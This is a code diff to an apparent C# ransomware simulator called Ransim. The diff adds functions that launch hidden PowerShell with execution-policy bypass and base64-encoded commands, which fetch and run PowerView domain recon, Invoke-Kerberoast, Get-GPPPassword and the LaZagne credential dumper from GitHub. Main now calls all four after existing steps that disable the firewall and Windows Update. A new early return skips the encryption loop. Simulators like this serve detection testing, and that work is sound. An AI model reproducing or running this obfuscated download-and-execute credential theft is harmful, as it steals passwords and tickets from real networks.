@@ -2,8 +2,8 @@
 # Title:        Ransim
 # Author:       d4rk-d4nph3
 # Description:  Ransomware Simulator
-# Version:      0.2 (Dev)
-# Released at:  xxxx/xx/xx
+# Version:      0.1
+# Released at:  2020/07/05
 ########################################################################################*/
 
 using System;
@@ -122,6 +122,34 @@ namespace Ransim
             Process.Start(@"C:\Windows\System32\sc.exe", "config wuauserv start=disabled");
         }
         
+        static void RunPowerView()
+        {
+            // Fetch and run PowerView.ps1
+            /* Runs Invoke-WebRequest -useb https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 | iex; Get-NetDomain; Get-NetDomainController; Get-NetGPO; Invoke-ShareFinder */
+            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHMAZQBiACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBQAG8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAHAAbABvAGkAdAAvAG0AYQBzAHQAZQByAC8AUgBlAGMAbwBuAC8AUABvAHcAZQByAFYAaQBlAHcALgBwAHMAMQAgAHwAIABpAGUAeAA7ACAARwBlAHQALQBOAGUAdABEAG8AbQBhAGkAbgA7ACAARwBlAHQALQBOAGUAdABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQByADsAIABHAGUAdAAtAE4AZQB0AEcAUABPADsAIABJAG4AdgBvAGsAZQAtAFMAaABhAHIAZQBGAGkAbgBkAGUAcgA=");
+
+        }
+
+        static void InvokeKerberoast()
+        {
+            // Fetch and run Invoke-Kerberoast.ps1
+            /* Runs Invoke-WebRequest -useb https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1 | iex; Invoke-Kerberoast | fl */
+            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHMAZQBiACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBFAG0AcABpAHIAZQBQAHIAbwBqAGUAYwB0AC8ARQBtAHAAaQByAGUALwBtAGEAcwB0AGUAcgAvAGQAYQB0AGEALwBtAG8AZAB1AGwAZQBfAHMAbwB1AHIAYwBlAC8AYwByAGUAZABlAG4AdABpAGEAbABzAC8ASQBuAHYAbwBrAGUALQBLAGUAcgBiAGUAcgBvAGEAcwB0AC4AcABzADEAIAB8ACAAaQBlAHgAOwAgAEkAbgB2AG8AawBlAC0ASwBlAHIAYgBlAHIAbwBhAHMAdAAgAHwAIABmAGwA");
+        }
+
+        static void InvokeGPPPassword()
+        {
+            // Fetch and run Invoke-GPPPassword.ps1
+            /* Runs Invoke-WebRequest -useb https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 | iex; Get-GPPPassword */
+            Process.Start("powershell.exe", "-nop -win hid -exec bypass -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQB1AHMAZQBiACAAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBQAG8AdwBlAHIAUwBoAGUAbABsAE0AYQBmAGkAYQAvAFAAbwB3AGUAcgBTAHAAbABvAGkAdAAvAG0AYQBzAHQAZQByAC8ARQB4AGYAaQBsAHQAcgBhAHQAaQBvAG4ALwBHAGUAdAAtAEcAUABQAFAAYQBzAHMAdwBvAHIAZAAuAHAAcwAxACAAfAAgAGkAZQB4ADsAIABHAGUAdAAtAEcAUABQAFAAYQBzAHMAdwBvAHIAZAA=");
+        }
+
+        static void RunLaZagne()
+        {
+            // Fetch and run LaZagne
+            /* Runs Invoke-WebRequest -URI https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe -Out $env:temp\laz.exe; Start-Process $env:temp\laz.exe -ArgumentList "memory" -NoNewWindow */
+            Process.Start("powershell.exe", "-nop - win hid - exec bypass - encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAFIASQAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AQQBsAGUAcwBzAGEAbgBkAHIAbwBaAC8ATABhAFoAYQBnAG4AZQAvAHIAZQBsAGUAYQBzAGUAcwAvAGQAbwB3AG4AbABvAGEAZAAvADIALgA0AC4AMwAvAGwAYQB6AGEAZwBuAGUALgBlAHgAZQAgAC0ATwB1AHQAIAAkAGUAbgB2ADoAdABlAG0AcABcAGwAYQB6AC4AZQB4AGUAOwAgAFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAkAGUAbgB2ADoAdABlAG0AcABcAGwAYQB6AC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAIgBtAGUAbQBvAHIAeQAiACAALQBOAG8ATgBlAHcAVwBpAG4AZABvAHcADQAKAA==");
+        }
         static void DisableFirewall()
         {
             Process.Start(@"C:\Windows\System32\netsh.exe", "advfirewall set allprofiles state off");
@@ -236,9 +264,15 @@ namespace Ransim
 
             // Runs a barrage of Registry manipulations commands
             ManipulateRegistry();
-           
+
             StopServices();
 
+            RunPowerView();
+            RunLaZagne();
+            InvokeGPPPassword();
+            InvokeKerberoast();
+
+            return;
             Console.WriteLine("Starting encryption process");
             // Iterate over files in the target directory for encryption.
             foreach (string file in files)
